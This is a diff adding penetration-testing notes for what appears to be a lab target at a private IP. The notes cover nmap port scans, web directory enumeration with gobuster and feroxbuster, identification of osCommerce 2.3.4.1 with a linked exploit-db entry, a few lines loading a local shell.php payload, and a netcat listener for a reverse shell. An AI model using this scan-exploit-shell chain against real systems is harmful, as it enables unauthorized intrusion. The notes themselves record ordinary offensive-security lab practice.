@@ -79,5 +79,18 @@ nmap 192.168.213.223
 sudo nmap -sU --open -p 161 192.168.213.223
 
 # 80,443 show up, but are closed, 161 open
+# fastest nmap scan (-pN, -sT make it slower)
+sudo nmap -p- -Pn 192.168.213.223 -sS -T 5 --verbose
+nmap -sT -A -p 60001 192.168.213.223
 
+# enumerate webserver at 60001
+gobuster dir -u http://192.168.213.223:60001 -w /usr/share/wordlists/dirb/common.txt
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.213.223:60001
+
+# find http://192.168.213.223:60001/docs/release_notes.pdf - # osCommerce 2.3.4.1
+# find https://www.exploit-db.com/exploits/44374
+
+my_shell_file = open("/home/kali/relia/shell.php")
+shell_data = my_shell_file.read()
+ nc -nvlp 443
 ```
